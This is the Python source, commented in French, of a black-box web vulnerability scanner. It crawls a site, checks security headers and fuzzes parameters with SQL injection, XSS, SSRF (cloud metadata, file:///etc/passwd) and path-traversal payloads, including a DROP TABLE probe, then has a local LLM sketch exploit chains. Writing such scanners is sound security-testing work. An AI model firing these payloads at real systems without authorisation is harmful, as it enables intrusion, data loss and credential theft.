"""
BELIEF — Network Black-Box Scanner (Phase 1)

Module d'analyse black-box réseau/web.
Ne nécessite PAS de code source : prend une URL et trouve des vulnérabilités.

Usage :
    from belief.network_scanner import NetworkScanner, ScanConfig
    scanner = NetworkScanner(ScanConfig(target="https://target.com"))
    report = scanner.scan()
    report.print_summary()
    report.save("scan_report.json")

Ou en ligne de commande :
    python3 belief_network_scanner.py https://target.com
"""

from __future__ import annotations

import json
import re
import sys
import time
import logging
import urllib.parse
from dataclasses import dataclass, field
from typing import Optional

import httpx

logger = logging.getLogger("belief.network")
logging.basicConfig(level=logging.INFO, format="%(asctime)s [%(levelname)s] %(message)s")

# ─────────────────────────────────────────────────────────────────────────────
#  Configuration
# ─────────────────────────────────────────────────────────────────────────────

OLLAMA_DEFAULT = "http://localhost:11434"

SEVERITY_COLORS = {
    "critical": "\033[91m",  # red
    "high":     "\033[93m",  # yellow
    "medium":   "\033[94m",  # blue
    "low":      "\033[96m",  # cyan
    "info":     "\033[90m",  # gray
    "reset":    "\033[0m",
}

@dataclass
class ScanConfig:
    target: str                          # URL cible (ex: https://example.com)
    ollama_host: str = OLLAMA_DEFAULT    # Hôte Ollama (ex: http://172.x.x.x:11434)
    model: str = "qwen2.5:14b-instruct-q4_K_M"
    max_pages: int = 30                  # Nombre de pages à crawler
    timeout: int = 10                    # Timeout HTTP en secondes
    delay: float = 0.3                   # Délai entre requêtes (politesse)
    fuzz_params: bool = True             # Fuzzer les paramètres GET/POST
    test_headers: bool = True            # Tester les headers de sécurité
    test_auth: bool = True               # Tester bypass d'authentification
    test_sqli: bool = True               # Tester SQL injection
    test_xss: bool = True                # Tester XSS reflected
    test_ssrf: bool = True               # Tester SSRF
    test_lfi: bool = True                # Tester LFI/path traversal
    user_agent: str = "Mozilla/5.0 (BELIEF-Scanner/1.0)"
    verbose: bool = True


# ─────────────────────────────────────────────────────────────────────────────
#  Data models
# ─────────────────────────────────────────────────────────────────────────────

@dataclass
class Endpoint:
    """Un endpoint découvert sur la cible."""
    url: str
    method: str = "GET"
    params: dict = field(default_factory=dict)
    forms: list = field(default_factory=list)
    status_code: int = 0
    content_type: str = ""
    response_size: int = 0
    response_time: float = 0.0
    headers: dict = field(default_factory=dict)
    body_snippet: str = ""  # 500 premiers chars


@dataclass
class Finding:
    """Une vulnérabilité ou observation de sécurité détectée."""
    severity: str          # critical / high / medium / low / info
    vuln_type: str         # SQLi / XSS / SSRF / LFI / Header / Auth / Config
    url: str
    description: str
    evidence: str          # Preuve concrète (payload, réponse)
    poc: str = ""          # Proof of Concept curl / python
    cwe: str = ""
    cvss: float = 0.0
    remediation: str = ""


@dataclass
class ScanReport:
    """Rapport complet du scan."""
    target: str
    start_time: str = ""
    end_time: str = ""
    endpoints_found: int = 0
    requests_made: int = 0
    findings: list[Finding] = field(default_factory=list)
    tech_stack: list[str] = field(default_factory=list)
    security_headers: dict = field(default_factory=dict)
    llm_analysis: str = ""

    def by_severity(self, sev: str) -> list[Finding]:
        return [f for f in self.findings if f.severity == sev]

    def print_summary(self):
        C = SEVERITY_COLORS
        print(f"\n{'='*60}")
        print(f"  BELIEF Network Scan — {self.target}")
        print(f"{'='*60}")
        print(f"  Endpoints : {self.endpoints_found}")
        print(f"  Requêtes  : {self.requests_made}")
        print(f"  Durée     : {self.start_time} → {self.end_time}")
        print()

        if self.tech_stack:
            print(f"  Tech détectée : {', '.join(self.tech_stack)}")
            print()

        total = len(self.findings)
        if total == 0:
            print(f"  {C['info']}Aucune vuln trouvée.{C['reset']}")
        else:
            for sev in ["critical", "high", "medium", "low", "info"]:
                items = self.by_severity(sev)
                if items:
                    print(f"  {C[sev]}{sev.upper():10} {len(items)}{C['reset']}")

            print(f"\n{'─'*60}")
            print("  FINDINGS DÉTAILLÉS")
            print(f"{'─'*60}")
            order = ["critical", "high", "medium", "low", "info"]
            sorted_findings = sorted(self.findings, key=lambda f: order.index(f.severity))
            for f in sorted_findings:
                print(f"\n  {C[f.severity]}[{f.severity.upper()}] {f.vuln_type}{C['reset']}")
                print(f"  URL       : {f.url}")
                print(f"  Desc      : {f.description}")
                print(f"  Preuve    : {f.evidence[:200]}")
                if f.poc:
                    print(f"  PoC       : {f.poc}")
                if f.remediation:
                    print(f"  Fix       : {f.remediation}")
                if f.cwe:
                    print(f"  CWE       : {f.cwe}")

        if self.llm_analysis:
            print(f"\n{'─'*60}")
            print("  ANALYSE LLM")
            print(f"{'─'*60}")
            print(f"  {self.llm_analysis}")

        print(f"\n{'='*60}\n")

    def save(self, path: str):
        data = {
            "target": self.target,
            "start_time": self.start_time,
            "end_time": self.end_time,
            "stats": {
                "endpoints_found": self.endpoints_found,
                "requests_made": self.requests_made,
                "findings_total": len(self.findings),
                "critical": len(self.by_severity("critical")),
                "high": len(self.by_severity("high")),
                "medium": len(self.by_severity("medium")),
                "low": len(self.by_severity("low")),
            },
            "tech_stack": self.tech_stack,
            "security_headers": self.security_headers,
            "findings": [
                {
                    "severity": f.severity,
                    "vuln_type": f.vuln_type,
                    "url": f.url,
                    "description": f.description,
                    "evidence": f.evidence,
                    "poc": f.poc,
                    "cwe": f.cwe,
                    "cvss": f.cvss,
                    "remediation": f.remediation,
                }
                for f in self.findings
            ],
            "llm_analysis": self.llm_analysis,
        }
        with open(path, "w") as fp:
            json.dump(data, fp, indent=2)
        logger.info(f"Rapport sauvegardé : {path}")


# ─────────────────────────────────────────────────────────────────────────────
#  Payloads de fuzzing
# ─────────────────────────────────────────────────────────────────────────────

SQLI_PAYLOADS = [
    "'",
    "\"",
    "' OR '1'='1",
    "' OR 1=1--",
    "1 AND SLEEP(2)--",
    "1; DROP TABLE users--",
    "' UNION SELECT NULL--",
    "admin'--",
    "' OR 'x'='x",
]

XSS_PAYLOADS = [
    "<script>alert(1)</script>",
    "\"><script>alert(1)</script>",
    "<img src=x onerror=alert(1)>",
    "javascript:alert(1)",
    "';alert(1)//",
    "<svg onload=alert(1)>",
]

SSRF_PAYLOADS = [
    "http://127.0.0.1",
    "http://localhost",
    "http://169.254.169.254",              # AWS metadata
    "http://169.254.169.254/latest/meta-data/",
    "http://[::1]",
    "http://0.0.0.0",
    "file:///etc/passwd",
]

LFI_PAYLOADS = [
    "../../../../etc/passwd",
    "../../../etc/passwd",
    "....//....//....//etc/passwd",
    "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
    "/etc/passwd",
    "..\\..\\..\\windows\\win.ini",
    "php://filter/convert.base64-encode/resource=index.php",
]

AUTH_BYPASS_PATHS = [
    "/admin", "/admin/", "/administrator", "/wp-admin", "/dashboard",
    "/api/admin", "/api/users", "/api/config", "/api/settings",
    "/config", "/backup", "/debug", "/test",
    "/.env", "/.git/config", "/web.config", "/config.php",
    "/robots.txt", "/sitemap.xml", "/.well-known/security.txt",
]

INTERESTING_HEADERS = [
    "X-Powered-By", "Server", "X-AspNet-Version",
    "X-Generator", "X-Drupal-Cache", "X-Varnish",
    "X-Frame-Options", "Content-Security-Policy",
    "X-XSS-Protection", "X-Content-Type-Options",
    "Strict-Transport-Security", "Access-Control-Allow-Origin",
    "X-Debug-Token", "X-Debug-Token-Link",
]

SECURITY_HEADERS_REQUIRED = {
    "X-Frame-Options": "Protège contre le clickjacking (CWE-1021)",
    "X-Content-Type-Options": "Empêche MIME sniffing (CWE-16)",
    "Content-Security-Policy": "Réduit l'impact XSS (CWE-79)",
    "Strict-Transport-Security": "Force HTTPS (CWE-311)",
    "X-XSS-Protection": "Protection XSS navigateur",
    "Referrer-Policy": "Contrôle les fuites de référent",
}

SQLI_ERROR_PATTERNS = [
    "sql syntax", "mysql_fetch", "ora-", "pg_query",
    "sqlite_", "odbc", "db2_", "sybase", "jdbc",
    "you have an error in your sql",
    "warning: mysql", "unclosed quotation",
    "microsoft ole db provider for sql server",
    "syntax error or access violation",
    "division by zero",
]

LFI_SUCCESS_PATTERNS = [
    "root:x:", "bin:x:", "daemon:x:",  # /etc/passwd
    "[boot loader]", "[operating systems]",  # win.ini
    "<?php",  # PHP source
]


# ─────────────────────────────────────────────────────────────────────────────
#  Scanner principal
# ─────────────────────────────────────────────────────────────────────────────

class NetworkScanner:
    """
    Scanner black-box BELIEF.

    Crawl → Fingerprint → Fuzz → LLM Analysis → Report
    """

    def __init__(self, config: ScanConfig):
        self.config = config
        self.report = ScanReport(target=config.target)
        self.visited: set[str] = set()
        self.endpoints: list[Endpoint] = []
        self.request_count = 0

        base = urllib.parse.urlparse(config.target)
        self.base_url = f"{base.scheme}://{base.netloc}"
        self.base_host = base.netloc

        self.http = httpx.Client(
            timeout=config.timeout,
            follow_redirects=True,
            headers={"User-Agent": config.user_agent},
            verify=False,  # Pentest : on accepte les certs auto-signés
        )

    # ── HTTP helpers ──────────────────────────────────────────────────────────

    def _get(self, url: str, params: dict | None = None) -> httpx.Response | None:
        try:
            time.sleep(self.config.delay)
            r = self.http.get(url, params=params)
            self.request_count += 1
            return r
        except Exception as e:
            logger.debug(f"GET {url} failed: {e}")
            return None

    def _post(self, url: str, data: dict) -> httpx.Response | None:
        try:
            time.sleep(self.config.delay)
            r = self.http.post(url, data=data)
            self.request_count += 1
            return r
        except Exception as e:
            logger.debug(f"POST {url} failed: {e}")
            return None

    def _log(self, msg: str):
        if self.config.verbose:
            logger.info(msg)

    # ── Phase 1 : Crawl ───────────────────────────────────────────────────────

    def _crawl(self):
        self._log(f"[CRAWL] Démarrage sur {self.config.target}")
        queue = [self.config.target]

        while queue and len(self.visited) < self.config.max_pages:
            url = queue.pop(0)
            if url in self.visited:
                continue
            self.visited.add(url)

            r = self._get(url)
            if r is None:
                continue

            ep = Endpoint(
                url=url,
                status_code=r.status_code,
                content_type=r.headers.get("content-type", ""),
                response_size=len(r.content),
                headers=dict(r.headers),
                body_snippet=r.text[:500],
            )
            self.endpoints.append(ep)

            # Extraire liens
            if "text/html" in ep.content_type:
                links = self._extract_links(r.text, url)
                for link in links:
                    if link not in self.visited and self._is_same_host(link):
                        queue.append(link)

            # Extraire formulaires
            ep.forms = self._extract_forms(r.text, url)

            # Extraire params depuis l'URL
            parsed = urllib.parse.urlparse(url)
            if parsed.query:
                ep.params = dict(urllib.parse.parse_qsl(parsed.query))

        self.report.endpoints_found = len(self.endpoints)
        self._log(f"[CRAWL] {len(self.endpoints)} endpoints trouvés")

    def _extract_links(self, html: str, base_url: str) -> list[str]:
        links = []
        # href
        for href in re.findall(r'href=["\']([^"\'#?]+)["\']', html):
            full = urllib.parse.urljoin(base_url, href)
            if self._is_same_host(full):
                links.append(full)
        # action (forms)
        for action in re.findall(r'action=["\']([^"\']+)["\']', html):
            full = urllib.parse.urljoin(base_url, action)
            if self._is_same_host(full):
                links.append(full)
        return list(set(links))[:20]

    def _extract_forms(self, html: str, base_url: str) -> list[dict]:
        forms = []
        form_blocks = re.findall(r'<form[^>]*>(.*?)</form>', html, re.DOTALL | re.IGNORECASE)
        for block in form_blocks:
            action_m = re.search(r'action=["\']([^"\']+)["\']', block, re.IGNORECASE)
            method_m = re.search(r'method=["\']([^"\']+)["\']', block, re.IGNORECASE)
            inputs = re.findall(r'<input[^>]+name=["\']([^"\']+)["\']', block, re.IGNORECASE)
            forms.append({
                "action": urllib.parse.urljoin(base_url, action_m.group(1)) if action_m else base_url,
                "method": method_m.group(1).upper() if method_m else "GET",
                "inputs": inputs,
            })
        return forms

    def _is_same_host(self, url: str) -> bool:
        try:
            return urllib.parse.urlparse(url).netloc == self.base_host
        except Exception:
            return False

    # ── Phase 2 : Fingerprint ─────────────────────────────────────────────────

    def _fingerprint(self):
        self._log("[FINGERPRINT] Analyse des headers et technologies")
        if not self.endpoints:
            return

        first = self.endpoints[0]
        headers = first.headers
        body = first.body_snippet.lower()
        tech = []

        # Server / framework
        server = headers.get("server", "")
        if server:
            tech.append(f"Server:{server}")
            self.report.findings.append(Finding(
                severity="info",
                vuln_type="Server Banner",
                url=first.url,
                description=f"Version du serveur exposée : {server}",
                evidence=f"Header Server: {server}",
                remediation="Masquer ou généraliser le header Server",
            ))

        if "x-powered-by" in headers:
            tech.append(f"Powered-by:{headers['x-powered-by']}")

        # Tech detection from body
        if "wp-content" in body or "wp-includes" in body:
            tech.append("WordPress")
        if "joomla" in body:
            tech.append("Joomla")
        if "drupal" in body:
            tech.append("Drupal")
        if "laravel" in body:
            tech.append("Laravel")
        if "django" in body:
            tech.append("Django")
        if "react" in body or "reactdom" in body:
            tech.append("React")
        if "vue.js" in body or "vuejs" in body:
            tech.append("Vue.js")
        if "jquery" in body:
            tech.append("jQuery")

        # Check security headers
        missing = []
        for h, reason in SECURITY_HEADERS_REQUIRED.items():
            present = h.lower() in {k.lower(): v for k, v in headers.items()}
            self.report.security_headers[h] = "present" if present else "MISSING"
            if not present:
                missing.append(h)

        if missing:
            self.report.findings.append(Finding(
                severity="medium",
                vuln_type="Missing Security Headers",
                url=first.url,
                description=f"Headers de sécurité manquants : {', '.join(missing)}",
                evidence=f"Headers absents : {missing}",
                cwe="CWE-693",
                remediation="Ajouter les headers de sécurité recommandés (OWASP Secure Headers Project)",
            ))

        # CORS wildcard
        cors = headers.get("access-control-allow-origin", "")
        if cors == "*":
            self.report.findings.append(Finding(
                severity="medium",
                vuln_type="CORS Wildcard",
                url=first.url,
                description="CORS configuré avec wildcard (*) — tout domaine peut faire des requêtes cross-origin",
                evidence=f"Access-Control-Allow-Origin: *",
                cwe="CWE-942",
                cvss=5.3,
                poc=f'curl -H "Origin: https://evil.com" {first.url} -I',
                remediation="Restreindre CORS aux domaines autorisés explicitement",
            ))

        self.report.tech_stack = tech
        self._log(f"[FINGERPRINT] Tech : {tech}")

    # ── Phase 3 : Auth bypass & sensitive paths ───────────────────────────────

    def _test_auth_bypass(self):
        if not self.config.test_auth:
            return
        self._log("[AUTH] Test des chemins sensibles")

        for path in AUTH_BYPASS_PATHS:
            url = self.base_url + path
            r = self._get(url)
            if r is None:
                continue

            if r.status_code == 200:
                severity = "high"
                if any(x in path for x in [".env", ".git", "config", "backup"]):
                    severity = "critical"

                poc_cmd = f"curl -s {url}"

                self.report.findings.append(Finding(
                    severity=severity,
                    vuln_type="Sensitive Path Exposure",
                    url=url,
                    description=f"Chemin sensible accessible sans authentification : {path}",
                    evidence=f"HTTP {r.status_code} — taille: {len(r.content)} bytes",
                    poc=poc_cmd,
                    cwe="CWE-552",
                    cvss=7.5 if severity == "high" else 9.1,
                    remediation=f"Protéger {path} par authentification ou supprimer si inutile",
                ))
                self._log(f"[AUTH] {severity.upper()} : {path} → HTTP {r.status_code}")

    # ── Phase 4 : SQL Injection ───────────────────────────────────────────────

    def _test_sqli(self):
        if not self.config.test_sqli:
            return
        self._log("[SQLi] Test des injections SQL")

        testable = [ep for ep in self.endpoints if ep.params or ep.forms]

        for ep in testable[:10]:  # limiter à 10 endpoints
            # Test params GET
            for param, orig_val in ep.params.items():
                for payload in SQLI_PAYLOADS[:4]:  # 4 payloads suffit en phase 1
                    test_params = dict(ep.params)
                    test_params[param] = orig_val + payload
                    r = self._get(ep.url, params=test_params)
                    if r is None:
                        continue

                    body_lower = r.text.lower()
                    for pattern in SQLI_ERROR_PATTERNS:
                        if pattern in body_lower:
                            poc = (
                                f"curl '{ep.url}?{param}={urllib.parse.quote(orig_val + payload)}'"
                            )
                            self.report.findings.append(Finding(
                                severity="critical",
                                vuln_type="SQL Injection",
                                url=ep.url,
                                description=f"Injection SQL détectée sur paramètre '{param}'",
                                evidence=f"Payload: {payload}\nErreur SQL dans la réponse: '{pattern}'",
                                poc=poc,
                                cwe="CWE-89",
                                cvss=9.8,
                                remediation="Utiliser des requêtes paramétrées / prepared statements. Ne jamais concaténer user input dans SQL.",
                            ))
                            self._log(f"[SQLi] CRITICAL : param={param}, payload={payload}")
                            break  # found, next param

    # ── Phase 5 : XSS reflected ───────────────────────────────────────────────

    def _test_xss(self):
        if not self.config.test_xss:
            return
        self._log("[XSS] Test des injections XSS")

        testable = [ep for ep in self.endpoints if ep.params]

        for ep in testable[:10]:
            for param in ep.params:
                for payload in XSS_PAYLOADS[:3]:
                    test_params = dict(ep.params)
                    test_params[param] = payload
                    r = self._get(ep.url, params=test_params)
                    if r is None:
                        continue

                    if payload in r.text:
                        poc = f"curl '{ep.url}?{param}={urllib.parse.quote(payload)}'"
                        self.report.findings.append(Finding(
                            severity="high",
                            vuln_type="XSS Reflected",
                            url=ep.url,
                            description=f"XSS réfléchi sur paramètre '{param}' — payload renvoyé non échappé",
                            evidence=f"Payload: {payload}\nReflected in response at pos: {r.text.find(payload)}",
                            poc=poc,
                            cwe="CWE-79",
                            cvss=6.1,
                            remediation="Encoder/échapper tous les inputs utilisateur avant affichage. Implémenter CSP.",
                        ))
                        self._log(f"[XSS] HIGH : param={param}")
                        break

    # ── Phase 6 : LFI / Path Traversal ───────────────────────────────────────

    def _test_lfi(self):
        if not self.config.test_lfi:
            return
        self._log("[LFI] Test du path traversal")

        # Cherche params qui ressemblent à des fichiers
        file_params = []
        for ep in self.endpoints:
            for param, val in ep.params.items():
                if any(x in param.lower() for x in ["file", "path", "page", "template", "include", "doc", "read"]):
                    file_params.append((ep, param))

        for ep, param in file_params[:5]:
            for payload in LFI_PAYLOADS[:4]:
                test_params = dict(ep.params)
                test_params[param] = payload
                r = self._get(ep.url, params=test_params)
                if r is None:
                    continue

                for pattern in LFI_SUCCESS_PATTERNS:
                    if pattern in r.text:
                        poc = f"curl '{ep.url}?{param}={urllib.parse.quote(payload)}'"
                        self.report.findings.append(Finding(
                            severity="critical",
                            vuln_type="Local File Inclusion",
                            url=ep.url,
                            description=f"LFI sur paramètre '{param}' — lecture de fichiers système possible",
                            evidence=f"Payload: {payload}\nPattern trouvé: {pattern}",
                            poc=poc,
                            cwe="CWE-22",
                            cvss=9.1,
                            remediation="Valider et sanitiser tous les chemins de fichiers. Utiliser une liste blanche.",
                        ))
                        self._log(f"[LFI] CRITICAL : param={param}")
                        break

    # ── Phase 7 : SSRF ────────────────────────────────────────────────────────

    def _test_ssrf(self):
        if not self.config.test_ssrf:
            return
        self._log("[SSRF] Test des SSRF")

        # Cherche params qui ressemblent à des URLs
        url_params = []
        for ep in self.endpoints:
            for param, val in ep.params.items():
                if any(x in param.lower() for x in ["url", "uri", "endpoint", "host", "webhook", "callback", "redirect", "return"]):
                    url_params.append((ep, param))

        for ep, param in url_params[:5]:
            for payload in SSRF_PAYLOADS[:3]:
                test_params = dict(ep.params)
                test_params[param] = payload
                r = self._get(ep.url, params=test_params)
                if r is None:
                    continue

                # Heuristiques : réponse inattendue, changement de taille, contenu différent
                if r.status_code == 200 and any(x in r.text.lower() for x in ["root", "localhost", "169.254", "private"]):
                    poc = f"curl '{ep.url}?{param}={urllib.parse.quote(payload)}'"
                    self.report.findings.append(Finding(
                        severity="critical",
                        vuln_type="SSRF",
                        url=ep.url,
                        description=f"SSRF potentiel sur paramètre '{param}'",
                        evidence=f"Payload: {payload} — réponse HTTP 200 avec contenu interne",
                        poc=poc,
                        cwe="CWE-918",
                        cvss=9.0,
                        remediation="Valider les URLs côté serveur. Utiliser une liste blanche de domaines autorisés.",
                    ))
                    self._log(f"[SSRF] CRITICAL : param={param}")

    # ── Phase 8 : Analyse LLM ─────────────────────────────────────────────────

    def _llm_analyze(self):
        """Envoie un résumé des findings au LLM pour une analyse contextuelle."""
        self._log("[LLM] Analyse des résultats...")

        # Construire le contexte pour le LLM
        findings_summary = []
        for f in self.report.findings[:15]:
            findings_summary.append(
                f"[{f.severity.upper()}] {f.vuln_type}: {f.description}"
            )

        tech_info = ", ".join(self.report.tech_stack) if self.report.tech_stack else "inconnu"
        headers_missing = [k for k, v in self.report.security_headers.items() if v == "MISSING"]

        prompt = f"""Tu es un expert en sécurité offensive (pentest).

Cible : {self.config.target}
Technologies détectées : {tech_info}
Endpoints analysés : {self.report.endpoints_found}
Headers sécurité manquants : {', '.join(headers_missing) if headers_missing else 'aucun'}

Vulnérabilités trouvées :
{chr(10).join(findings_summary) if findings_summary else 'Aucune vulnérabilité critique détectée.'}

Analyse en 3 points :
1. Vecteur d'attaque le plus critique et son impact business réel
2. Chaîne d'exploitation possible (comment combiner ces vulns)
3. Priorité de remédiation (que corriger en premier)

Réponds de façon concise et actionnable, max 200 mots."""

        try:
            response = self.http.post(
                f"{self.config.ollama_host}/api/generate",
                json={
                    "model": self.config.model,
                    "prompt": prompt,
                    "stream": False,
                    "options": {"temperature": 0.3, "num_predict": 500},
                },
                timeout=60,
            )
            self.request_count += 1
            if response.status_code == 200:
                data = response.json()
                self.report.llm_analysis = data.get("response", "").strip()
                self._log("[LLM] Analyse terminée")
            else:
                self.report.llm_analysis = f"LLM indisponible (HTTP {response.status_code})"
        except Exception as e:
            self.report.llm_analysis = f"LLM indisponible : {e}"
            self._log(f"[LLM] Erreur : {e}")

    # ── Pipeline principal ────────────────────────────────────────────────────

    def scan(self) -> ScanReport:
        from datetime import datetime

        self.report.start_time = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        self._log(f"\n{'='*50}")
        self._log(f"BELIEF Network Scan — {self.config.target}")
        self._log(f"{'='*50}")

        # Ignorer les avertissements SSL (pentest)
        import urllib3
        urllib3.disable_warnings()

        try:
            self._crawl()
            self._fingerprint()
            self._test_auth_bypass()
            self._test_sqli()
            self._test_xss()
            self._test_lfi()
            self._test_ssrf()
            self._llm_analyze()
        except KeyboardInterrupt:
            self._log("\n[!] Scan interrompu par l'utilisateur")
        finally:
            self.report.end_time = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            self.report.requests_made = self.request_count
            self.http.close()

        return self.report


# ─────────────────────────────────────────────────────────────────────────────
#  CLI
# ─────────────────────────────────────────────────────────────────────────────

def main():
    if len(sys.argv) < 2:
        print("Usage: python3 belief_network_scanner.py <URL> [ollama_host] [model]")
        print("Ex:    python3 belief_network_scanner.py https://target.com http://172.17.0.1:11434")
        sys.exit(1)

    target = sys.argv[1]
    if not target.startswith("http"):
        target = "https://" + target

    ollama_host = sys.argv[2] if len(sys.argv) > 2 else OLLAMA_DEFAULT
    model = sys.argv[3] if len(sys.argv) > 3 else "qwen2.5:14b-instruct-q4_K_M"

    config = ScanConfig(
        target=target,
        ollama_host=ollama_host,
        model=model,
    )

    scanner = NetworkScanner(config)
    report = scanner.scan()
    report.print_summary()

    output_file = f"scan_{urllib.parse.urlparse(target).netloc.replace('.', '_')}.json"
    report.save(output_file)
    print(f"[+] Rapport JSON : {output_file}")


if __name__ == "__main__":
    main()